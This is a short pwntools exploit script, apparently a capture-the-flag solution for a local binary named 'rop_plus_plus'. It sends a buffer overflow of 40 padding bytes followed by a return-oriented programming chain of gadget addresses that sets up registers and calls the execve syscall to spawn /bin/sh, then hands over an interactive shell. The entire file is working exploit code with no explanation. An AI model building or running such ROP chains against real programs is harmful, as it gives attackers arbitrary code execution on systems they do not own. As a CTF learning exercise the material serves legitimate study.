import pwn

#pwn.context.log_level = "debug"
pwn.context.arch = "amd64"
#p = pwn.process("rop++/rop++/share/chal")
p=pwn.process('pwn/rop_plus_plus/chal')

p.recvuntil(b"show me rop\n> ")
_ret=0x40101a
payload = pwn.flat([
    b"A" * 40,
    0x401e3f,  # pop rdi; ret
    #0x7fffffffd940,  # /bin/sh
    0x7ffda8cb3b48,# /bin/sh
    0x409e6e,  # pop rsi; ret
    0x0,

    0x47ed0a,  # pop rax ; pop rdx ; pop rbx ; ret
    0x3b,  # rax (syscall execve)
    0x0,  # rdx
    0x1234,  # rbx (useless)
    #_ret,
    0x401bf4,  # syscall
    b"/bin/sh",
    b'\x00'
])

#p.sendline(payload)
pwn.pause()
p.send(payload)
pwn.pause()
p.interactive()

#  b *0x0000000000401792, right after read in main